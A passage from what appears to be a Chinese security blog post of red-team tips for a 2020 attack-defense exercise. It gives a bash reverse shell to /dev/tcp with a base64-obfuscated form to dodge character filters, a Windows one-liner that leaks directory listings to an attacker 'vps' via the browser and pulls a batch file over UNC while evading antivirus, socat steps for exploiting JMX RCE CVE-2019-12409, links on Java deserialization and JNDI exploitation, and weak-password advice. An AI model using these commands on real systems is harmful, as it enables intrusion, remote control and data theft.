    >https://krober.biz/misc/reverse_shell.php</a></p>
<p>3.很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参</p>
<p><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1</code></p>
<p>base64 可以转换成</p>
<p><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx</code></p>
<p>最终可以变成</p>
<p><code>bash -c &quot;{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}|{base64, -d}|{bash, -i}&quot;</code></p>
<p>4.windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以</p>
<p><code>for /f %s in ('dir c:\ /b') do explorer http://vps:8000/?%s</code></p>
<p><code>\\vps\share\shell.bat</code></p>
<p>5.针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况</p>
<p>这里主要是没有指定<code>hostname</code>, 这里可以使用<code>socat</code>进行流量转发, 无需修改POC, 以<code>CVE-2019-12409</code>为例</p>
<blockquote>
<p>这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现
这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址
通过查看报错, 可以得知内网地址, 例如 172.18.0.2
使用如下两条命令即可执行, 替换 <code>[报错中的ip]</code>, <code>[远程目标的ip]</code></p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip addr add [报错中的ip]/24 dev lo
</span></span><span class="line"><span class="cl">socat tcp4-listen:18983, bind=[报错中的ip], reuseaddr, fork tcp4-connect:[远程目标的ip]:18983
</span></span></code></pre></td></tr></table>
</div>
</div><p>6.Java 反序列化是这两年的重中之重, 如果有shell出不来可以参考以下链接</p>
<p>深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台
<a class="link" href="https://www.vulbox.com/knowledge/detail/?id=11"  target="_blank" rel="noopener"
    >https://www.vulbox.com/knowledge/detail/?id=11</a></p>
<p>tomcat不出网回显连续剧第六集 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/7535"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/7535</a></p>
<p>Weblogic T3/iiop 构造有回显exp方案分析 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/7489"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/7489</a></p>
<p>weblogic IIOP漏洞的回显构造研究 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/7393"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/7393</a></p>
<p>linux下java反序列化通杀回显方法的低配版实现 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/7307"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/7307</a></p>
<p>照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台
<a class="link" href="https://www.freebuf.com/vuls/232544.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/vuls/232544.html</a></p>
<p>如何绕过高版本JDK限制进行JNDI注入利用
<a class="link" href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p>
<p>JosephTribbianni/JNDI: JNDI 注入利用工具
<a class="link" href="https://github.com/JosephTribbianni/JNDI"  target="_blank" rel="noopener"
    >https://github.com/JosephTribbianni/JNDI</a></p>
<p>7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题
最后祝大家 <strong>开局有0day, 处处弱口令</strong></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/hvv/">HVV</a>
        
            <a href="/tags/2020%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/">2020攻防演练</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/whp5em3l/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg" loading="lazy" data-key="whp5em3l" data-hash="https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">关于微信内置浏览器 达到持久控制</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/1ypylhrh/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2or6.png" loading="lazy" data-key="1ypylhrh" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2y2or6.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Golang学习之并发编程</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/xb9uhh7c/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/gp/wallhaven-gpd95q.png" loading="lazy" data-key="xb9uhh7c" data-hash="https://w.wallhaven.cc/full/gp/wallhaven-gpd95q.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Golang学习之异常与文本文件处理</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/giabprkd/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/zy/wallhaven-zydldy.jpg" loading="lazy" data-key="giabprkd" data-hash="https://w.wallhaven.cc/full/zy/wallhaven-zydldy.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Golang学习之面向对象编程</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/wknjbadw/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/zy/wallhaven-zy9gwv.png" loading="lazy" data-key="wknjbadw" data-hash="https://w.wallhaven.cc/full/zy/wallhaven-zy9gwv.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Golang学习之复合类型</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="360rce/blog-comment"
        issue-term="pathname"
        
        label="utterances"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
    </section>
    <i class="powerby">
    <span id="busuanzi_container_site_pv">
        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
    </span>&nbsp;
    <span id="busuanzi_container_site_uv">
        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
      </span>
    </i>


</footer>
<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


    </body>
</html>
